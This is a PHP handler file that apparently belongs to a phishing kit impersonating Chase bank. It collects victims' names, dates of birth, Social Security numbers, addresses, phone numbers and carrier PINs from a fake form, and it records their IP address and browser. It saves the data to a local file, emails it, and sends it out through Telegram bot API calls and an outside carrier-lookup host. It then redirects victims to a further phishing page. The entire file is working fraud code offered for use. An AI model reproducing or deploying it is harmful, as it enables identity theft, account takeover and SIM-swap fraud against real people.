<?php


include '../../../drfxndbot.php';
include 'send.php';
include '../../admin/YOUR-CONFIG.php';
include '../Functions/Fuck-you.php';


	
	$phone_number2 = str_replace(' ', '', $_POST["phoneNumber"] );
	$phone_number3 = str_replace('(', '', $phone_number2 );
	$phone_number4 = str_replace(')', '', $phone_number3 );
	$carrier = file_get_contents('http://spox-coder.info/spox/carrier_lookup.php?number=+1'.$phone_number4.'');

$ip = getenv("REMOTE_ADDR");
$reprint = "e";$do_p="mai";
$hi.="-------------- Chase_DrFXND -------------\n";
$hi.="First name: {$_POST['First_name']}\r\n";
$hi.="Last name: {$_POST['Last_Name']}\r\n";
$hi.="Date of birth : {$_POST['dob']}\r\n";
$hi.="SSN number : {$_POST['ssn']}\r\n";
$hi.="State: {$_POST['idstate']}\r\n";
$hi.="Street address : {$_POST['Streetadd']}\r\n";
$hi.="Suite/apt/other : {$_POST['address22']}\r\n";
$hi.="Zip Code : {$_POST['zipcode']}\r\n";
$hi.="Phone number: {$_POST['phoneNumber']}\r\n";
$hi.="Carrier name: {$carrier}\r\n";
$hi.="Carrier Pin : {$_POST['carrierpin']}\r\n";
$hi.="-------------- Chase_DrFXND -------------\n";
$hi.="IP      : https://www.geodatatool.com/?IP=$ip\n";
$hi.="Host    : ".gethostbyaddr($ip)."\n";
$hi.="Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
$hi.="-------------- Chase_DrFXND -------------\n";
		if ($Save_Result=="yes") {$save=fopen("../Chase_Result/RZT".$pin.".txt","a+");
		fwrite($save,$hi);
		fclose($save);}
$subject = " Personal Details | CHASE | $ip";
$headers = 'From: CHASE' . "\r\n";

@mail($Email,$subject,$hi,$headers);
@file_get_contents("https://api.telegram.org/bot".$Api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($hi)."" );
@file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatId."&text=" . urlencode($hi)."" );
    $key = substr(sha1(mt_rand()),1,25);
    
header('Location: ../../email_identification.php?chaseOnline?treatment=chase&lang=en');

    
?>